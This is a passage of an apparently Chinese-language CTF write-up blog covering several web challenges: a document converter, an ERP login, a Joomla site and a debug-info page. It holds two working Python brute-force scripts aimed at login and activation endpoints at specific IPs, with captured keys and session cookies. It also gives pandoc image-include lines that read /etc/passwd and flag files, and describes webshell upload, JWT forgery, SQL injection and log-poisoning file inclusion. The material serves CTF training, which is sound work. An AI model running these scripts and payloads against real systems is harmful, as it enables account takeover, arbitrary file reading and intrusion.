+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs shell">import json<br>import base64<br>import hashlib<br>import requests<br>import time<br>import binascii<br>import uuid<br>from gmssl import sm4<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">🔴 必填区域：请填入你刚才在浏览器控制台 getFinalPackage() 捕获到的值</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 捕获到的 Key (32位 Hex)</span><br>CAPTURED_KEY = &quot;6a8d6af94060a07eba08f741ffc17fd3&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 捕获到的 IV (32位 Hex)</span><br>CAPTURED_IV = &quot;8d1061d89dd8983672d10a3c96647a54&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 捕获到的 Payload 里的 q 值 (SM2密文，非常长的那一段)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意：是从抓到的 json 里的 <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;...&quot;</span> 里面复制出来，不要带引号</span><br>CAPTURED_Q = &quot;367086fd33ab79866dca19f3bab3db2878cf797c9bc91039f0d06d149737499f3ccf261bff08d2de1ea16cf097752920a25db59c1e623dfbef0549c14bc1315b1666abc86b54e1ba838e49630933bd424ab762587386adb6aa6c7e7c2af0d3916a4a4d332f4f02a65156c448fa8678b692d42c4cf064ed150748c5e59c25c44ff0dd2a7402dd15133acd0b10760b14aa45df951f189f993a55edbf2c3e5089ac9e262abba9be8e9261799e22b596d17c8737&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">🟢 配置区域 (固定值)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br>SALT = &quot;|Infernity|&quot;<br>TARGET_URL = &quot;http://114.66.24.228:33336/login&quot;  # 确认端口<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">转换 Key 为二进制</span><br>KEY_BYTES = binascii.unhexlify( CAPTURED_KEY )<br>IV_BYTES = binascii.unhexlify( CAPTURED_IV )<br><br><br>def sm4_encrypt(plain_text) :<br>    &quot;&quot;&quot;SM4 CBC 加密&quot;&quot;&quot;<br>    crypt_sm4 = sm4.CryptSM4()<br>    crypt_sm4.set_key( KEY_BYTES , sm4.SM4_ENCRYPT )<br>    # gmssl 自动处理 PKCS7 填充<br>    encrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , plain_text.encode() )<br>    return encrypt_value.hex()<br><br><br>def sm4_decrypt(b64_cipher) :<br>    &quot;&quot;&quot;SM4 CBC 解密&quot;&quot;&quot;<br>    try :<br>        cipher_bytes = base64.b64decode( b64_cipher )<br>        crypt_sm4 = sm4.CryptSM4()<br>        crypt_sm4.set_key( KEY_BYTES , sm4.SM4_DECRYPT )<br>        decrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , cipher_bytes )<br>        return decrypt_value.decode( &#x27;utf-8&#x27; , errors=&#x27;ignore&#x27; )<br>    except :<br>        return None<br><br><br>def solve() :<br>    # 0. 准备固定的 KeyIvJson (用于 MD5 校验)<br>    # 必须无空格，与 JS 生成的一致<br>    key_iv_dict = &#123;&quot;key&quot; : CAPTURED_KEY , &quot;iv&quot; : CAPTURED_IV&#125;<br>    key_iv_json = json.dumps( key_iv_dict , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>    print( f&quot;[*] 使用固定 Q 值爆破&quot; )<br>    print( f&quot;[*] Key: &#123;CAPTURED_KEY&#125;&quot; )<br>    print( f&quot;[*] IV:  &#123;CAPTURED_IV&#125;&quot; )<br><br>    # 1. 读取字典<br>    try :<br>        with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>            passwords = [ line.strip() for line in f if line.strip() ]<br>    except :<br>        print( &quot;[-] 错误：找不到 password 文件&quot; )<br>        return<br><br>    print( f&quot;[*] 开始爆破 &#123;len( passwords )&#125; 个密码...&quot; )<br><br>    # 2. 循环爆破<br>    for pwd in passwords :<br>        # 构造 UserInfo<br>        # 严格遵循 Hook 到的字段顺序: userName -&gt; passWord -&gt; timeStamp -&gt; TOKEN<br>        # 注意：timeStamp 使用当前时间，TOKEN 模拟 MD5 格式<br>        user_info = &#123;<br>            &quot;userName&quot; : &quot;admin&quot; ,<br>            &quot;passWord&quot; : pwd ,<br>            &quot;timeStamp&quot; : int( time.time() * 1000 ) ,<br>            &quot;TOKEN&quot; : hashlib.md5( str( uuid.uuid4() ).encode() ).hexdigest()<br>        &#125;<br>        # 序列化 (去空格)<br>        user_info_json = json.dumps( user_info , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>        # 生成 p (加密新的 user_info)<br>        p_val = sm4_encrypt( user_info_json )<br><br>        # 生成 n (计算新的校验值)<br>        # 公式: UserInfo + Salt + KeyIv<br>        n_source = user_info_json + SALT + key_iv_json<br>        n_val = hashlib.md5( n_source.encode() ).hexdigest()<br><br>        # 组装 Payload (q 是固定的)<br>        final_payload = &#123;<br>            &quot;p&quot; : p_val ,<br>            &quot;q&quot; : CAPTURED_Q ,<br>            &quot;n&quot; : n_val<br>        &#125;<br>        final_b64 = base64.b64encode( json.dumps( final_payload , separators=(&#x27;,&#x27; , &#x27;:&#x27;) ).encode() ).decode()<br>        #print(&quot;pwd:&quot;+pwd)<br>        # 发包<br>        try :<br>            # 必须带上正确的 Header，否则可能触发 500<br>            headers = &#123;<br>                &quot;Content-Type&quot; : &quot;text/plain&quot; ,<br>                &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>                &quot;Referer&quot; : &quot;http://114.66.24.228:33336/&quot;<br>            &#125;<br>            resp = requests.post( TARGET_URL , data=final_b64 , headers=headers )<br>            #print(resp.text)<br>            body=resp.text<br>            # 结果分析<br>            if int(resp.headers.get(&#x27;Content-Length&#x27;)) &gt;=100 :<br>                print( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] 密码正确: &#123;pwd&#125;\n[RESULT]: &#123;body&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                break<br><br>        except Exception as e :<br>            pass<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Markdown2world"><a href="#Markdown2world" class="headerlink" title="Markdown2world"></a>Markdown2world</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844658929-dd26e47f-9ba0-4501-ad7b-9af07f51611f.png" srcset="/img/loading.gif" lazyload>访问之后是一个文档转换器，然后问了ai之后，一开始让转换成html试试能不能任意文件读取，发现不行。然后又试试可不可以参数注入，也不行，然后Gemini继续说到pandoc有一个特性</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844705243-b42b80c1-dd3f-4e3e-912b-c20249747357.png" srcset="/img/loading.gif" lazyload></p>
+<p>试了一下之后发现可行，在word/media下有一个.so文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844777186-589af012-72be-4582-82c3-f3216fb7b139.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开之后发现里面正是/etc/passwd的内容，那就只要猜一下flag的目录即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">![f1](/flag)<br>![f2](/flag.txt)<br>![f3](/app/flag)<br>![f4](/home/ctf/flag)<br></code></pre></td></tr></table></figure>
+
+<p>再次提交之后也是成功得到flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844836056-9feb4eb5-c5da-471c-b0ce-fc4f271f12a9.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="破阵阁训练赛"><a href="#破阵阁训练赛" class="headerlink" title="破阵阁训练赛"></a>破阵阁训练赛</h1><p>这个比赛挺适合新手的，就是刚开始的时候容器打不开，比赛还只有3小时</p>
+<h2 id="最简单的Web安全入门"><a href="#最简单的Web安全入门" class="headerlink" title="最简单的Web安全入门"></a>最简单的Web安全入门</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841206414-d05748b9-d028-4412-9884-f97eee2ba79c.png" srcset="/img/loading.gif" lazyload><br>id加引号有报错，直接sqlmap一把梭</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841233836-20a47719-64fb-4535-bc28-d76816db4a76.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="安全牛的ERP"><a href="#安全牛的ERP" class="headerlink" title="安全牛的ERP"></a>安全牛的ERP</h2><p>访问之后是登录页面，试了常见的弱口令无果，然后来扫路径</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769846559506-c5e6f500-bbde-499a-ae98-4093a7d31b31.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现一个api文档页面，测试了一下好像没啥用，没办法注册新用户，应该还是要往路径绕过这方面去想，在Gemini的多个测试payload下成功绕过</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847906288-11125c06-56ea-4ff2-a1dd-8277cd79cdf9.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847915924-26b4b155-50e1-4b03-954c-53d019b3b370.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实一开始就测试了../，但是可能是直接在浏览器输入的原因，没有绕过，现在在yakit试了一下直接成功了</p>
+<h2 id="激进的开发者"><a href="#激进的开发者" class="headerlink" title="激进的开发者"></a>激进的开发者</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848119716-e9080ad4-3cea-4be4-af56-062b1c772ef3.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据这个描述，先扫一波目录试试</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848180960-8eef4365-9d0e-4c2b-9b41-e079ebe0eeb8.png" srcset="/img/loading.gif" lazyload></p>
+<p>config.php无内容，可能需要参数，但是目前还不知道，先注册账号试试</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848401993-0f95f738-b655-44eb-86f4-c38efd7b1ccf.png" srcset="/img/loading.gif" lazyload></p>
+<p>登录上之后疑似有注入点，sqlmap嗦一把看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848437974-6b7ef6e3-059f-4a10-abdc-6af1613ba233.png" srcset="/img/loading.gif" lazyload></p>
+<p>登上去之后有个文件上传点，可以直接上传webshell</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848545719-d66e966e-b715-4c70-b404-cb62ba8730bd.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848656221-ae336453-f922-451f-818a-88a3ac295e3a.png" srcset="/img/loading.gif" lazyload></p>
+<p>看来一句话木马不行了，要上蚁剑才行，好吧，是我想多了，flag在/home/www-data目录下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848924811-8f304c95-455b-4ccb-a52a-345f78122079.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="贼牛掰的身份鉴权，还怕在失陷？"><a href="#贼牛掰的身份鉴权，还怕在失陷？" class="headerlink" title="贼牛掰的身份鉴权，还怕在失陷？"></a>贼牛掰的身份鉴权，还怕在失陷？</h2><p>访问之后是登录，登录失败会给一个普通用户的账号，登录之后抓包能看到token，结合题目描述，应该是jwt伪造</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850131488-8ced480b-63e3-4be0-8aef-088b93530a39.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后拿去伪造一个admin的token<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850196592-33f7ebf0-21c8-4d9a-b810-353a1b705966.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后拿到flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850209454-4a5159fb-258b-4e5a-bf1d-0e571222b90b.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="小小的挑战"><a href="#小小的挑战" class="headerlink" title="小小的挑战"></a>小小的挑战</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769855572576-9f9bd0d0-24e9-4f34-98d1-b58a20d575e6.png" srcset="/img/loading.gif" lazyload></p>
+<p>在路径中的htaccess.txt中可以看到这是joomla</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858438407-178802ab-f8ab-44ce-a080-02b6ef913f86.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实熟悉的人看到这些路径应该就能猜出来这是joomla</p>
+<p>然后可以用<code>/administrator/manifests/files/joomla.xml</code>路径判断joomla的具体版本</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858495744-a71ce08c-83d7-4f21-8893-c9524e0a823a.png" srcset="/img/loading.gif" lazyload></p>
+<p>有了具体版本就好办了，直接搜该版本对应的exp就行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858586168-0cd0a1df-6d0b-47af-9c0d-0a8f76e56e19.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859013476-53b2a2c5-430d-4deb-a0fa-9240e2caed38.png" srcset="/img/loading.gif" lazyload></p>
+<p>在这个文件中给了具体点，sqlmap命令都给了，直接照着运行即可，但是到后面爆数据的时候遇到问题了，这个里面的表全是<code>#__</code>开头，这导致sqlmap不太好跑，我这里用Gemini给的payload手工编码之后再注入</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858894156-7e1502bd-ff7e-4559-b88a-5bb32e50dfbc.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到hash，然后kali爆破一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">2y$10<span class="hljs-variable">$1XJmZJy0fG3u6LaYOj3n5eB8j6gocddi1c4rieSQ1VbgxTxWBGtGa</span></span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859037802-a90d3400-494a-4616-ac40-84ef4dcb023f.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后去<code>/administrator/index.php</code>登录管理员后台，然后在template处添加模板<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859737024-ed57835e-41f5-4673-bd10-9b313a6875cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后读取flag即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859754293-955db0ef-b3f2-4c13-aff4-a3335e5b6f4c.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="遗忘的调试信息"><a href="#遗忘的调试信息" class="headerlink" title="遗忘的调试信息"></a>遗忘的调试信息</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859903435-264e9da1-4bee-492d-8c26-557aa6615712.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据介绍，还是扫一下目录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859920511-f91cc6dd-7847-436d-b62a-c9aada80ae13.png" srcset="/img/loading.gif" lazyload></p>
+<p>这题得多找字典扫</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769861343030-30efcd5d-8120-4f54-a1eb-a49c15035fbc.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后在这个目录下一个个翻，找到有一个info.php有一个文件包含的功能</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862209244-81f5d610-6b21-4904-b64e-f380df83903d.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在有2个思路，一个是根据推测，flag文件应该是在<code>/home/www-data/flag</code>，读取即可，还有一个就是往日志中写入一句话木马，然后用这个info.php来包含</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862741529-f6f5e882-4abe-4c94-b584-69aaf7d5d99e.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后就是可以在一句话木马里面，在命令执行的前后输出一点特殊符号，不然找起来很麻烦</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862801919-07004bf2-5bd0-40f6-b0c9-7a35a30055de.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="有点限制，但不多"><a href="#有点限制，但不多" class="headerlink" title="有点限制，但不多"></a>有点限制，但不多</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862913197-94463a70-22cc-49e5-941f-b45cf69f5cd1.png" srcset="/img/loading.gif" lazyload><br>根据题目描述，应该是要绕过什么</p>
+<p>扫目录扫出这些</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769865188999-c6c89441-8ff5-44e5-8ea9-c823644d4bbd.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们注册账号，注册账号的时候要邮箱和其他display name要稍微长一点，不然登录不成功，当用同样的信息注册的时候提示邮箱已被使用就是成功了，然后登录提示账号未激活，要6位激活码，而正好激活页面需要userid和激活码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866409383-8c177ec7-27c7-492c-90c3-09998d32124f.png" srcset="/img/loading.gif" lazyload></p>
+<p>而userid可以在主页测出来</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866461281-8fa34082-a7d0-46dc-8e5d-f222217d5932.png" srcset="/img/loading.gif" lazyload></p>
+<p>那就是爆破激活码了，然后要注意的点是本次响应包中的token要作为下次爆破时参数里的token，爆破脚本如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import re<br>from tqdm import tqdm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= 配置区 =================</span><br>BASE_URL = &quot;http://175.27.169.122:56858&quot;<br>ACTIVATE_URL = f&quot;&#123;BASE_URL&#125;/activate.php&quot;<br>USER_ID = &quot;14&quot;  # 你的用户ID<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">填入你当前的 Cookie</span><br>COOKIES = &#123;<br>    &quot;joomla_user_state&quot; : &quot;logged_in&quot; ,<br>    &quot;joomla_remember_me_30166589d367bfdbe43cc3254602628c&quot; : &quot;uz80UeRF5loDQe4f.VvBTLOKTKl765S7znfCc&quot; ,<br>    &quot;460ada11b31d3c5e5ca6e58fd5d3de27&quot; : &quot;590c2000212f07d77f838c8d19d7bff7&quot; ,<br>    &quot;6f12c8b01052b36ca2996b535ee18e8d&quot; : &quot;d75f5e0706132dc3e9a4a675691a3c3e&quot; ,<br>    &quot;PHPSESSID&quot; : &quot;f5fd35f4fde42898ee1c56e97507a403&quot; ,<br>    &quot;user&quot; : &quot;test&quot; ,<br>    &quot;pass&quot; : &quot;7110eda4d09e062aa5e4a390b0a572ac0d2c0220&quot;<br>&#125;<br><br>HEADERS = &#123;<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>    &quot;Referer&quot; : ACTIVATE_URL ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==========================================</span><br><br>def get_token(html) :<br>    &quot;&quot;&quot;使用正则从 HTML 中提取隐藏的 token&quot;&quot;&quot;<br>    # 匹配 &lt;input type=&#x27;hidden&#x27; name=&#x27;token&#x27; value=&#x27;...&#x27;&gt;<br>    match = re.search( r&quot;name=&#x27;token&#x27; value=&#x27;(.*?)&#x27;&quot; , html )<br>    if match :<br>        return match.group( 1 )<br>    return None<br><br><br>def solve() :<br>    session = requests.Session()<br>    # 将预设的 Cookie 加入 Session<br>    for k , v in COOKIES.items() :<br>        session.cookies.set( k , v )<br><br>    # 1. 访问页面获取初始 Token<br>    print( &quot;[*] 正在获取初始 Token...&quot; )<br>    res = session.get( ACTIVATE_URL , headers=HEADERS )<br>    current_token = get_token( res.text )<br><br>    if not current_token :<br>        print( &quot;[-] 无法获取初始 Token，请检查网络或 Cookie&quot; )<br>        return<br><br>    print( f&quot;[+] 初始 Token: &#123;current_token&#125;&quot; )<br><br>    # 2. 开始爆破 000000 - 999999<br>    # 你可以根据需要调整范围<br>    for i in tqdm( range( 1000000 ) , desc=&quot;Brute Forcing&quot; ) :<br>        code = str( i ).zfill( 6 )  # 格式化为 6 位数字，如 000123<br><br>        data = &#123;<br>            &quot;userid&quot; : USER_ID ,<br>            &quot;activation_code&quot; : code ,<br>            &quot;token&quot; : current_token<br>        &#125;<br><br>        try :<br>            # 发送 POST 请求<br>            resp = session.post( ACTIVATE_URL , data=data , headers=HEADERS )<br><br>            # 3. 结果判断<br>            # 如果激活成功，通常页面会跳转，或者不包含 &quot;failed&quot; 关键字<br>            # 你需要根据实际成功的返回特征修改这里的判断逻辑<br>            if resp.status_code!=403 :<br>                print( f&quot;\n\n[SUCCESS] 爆破成功！&quot; )<br>                print( f&quot;[*] 激活码: &#123;code&#125;&quot; )<br>                print( f&quot;[*] 响应内容: &#123;resp.text&#125;&quot; )  # 打印前200字符<br>                break<br><br>            # 4. 【关键】获取下一个包所需的 Token<br>            # 服务器在响应体中会给出下一次操作的隐藏 token<br>            current_token = get_token( resp.text )<br><br>            if not current_token :<br>                # 如果没拿到 token，可能是请求太快被封了或者 Session 失效<br>                tqdm.write( f&quot;[!] 警告：在尝试 &#123;code&#125; 时未获取到新 Token，正在重新获取...&quot; )<br>                res = session.get( ACTIVATE_URL , headers=HEADERS )<br>                current_token = get_token( res.text )<br><br>        except Exception as e :<br>            tqdm.write( f&quot;[!] 网络错误: &#123;e&#125;&quot; )<br>            continue<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure>
+
+<p>然后在管理员主页源码中可以看到hash，是sha-1，拿去解密即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769870918548-bff17011-a740-4101-853e-af6f25e867db.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密登上管理员账号有一个执行命令的入口，这个入口就是blacklist.txt的限制点</p>
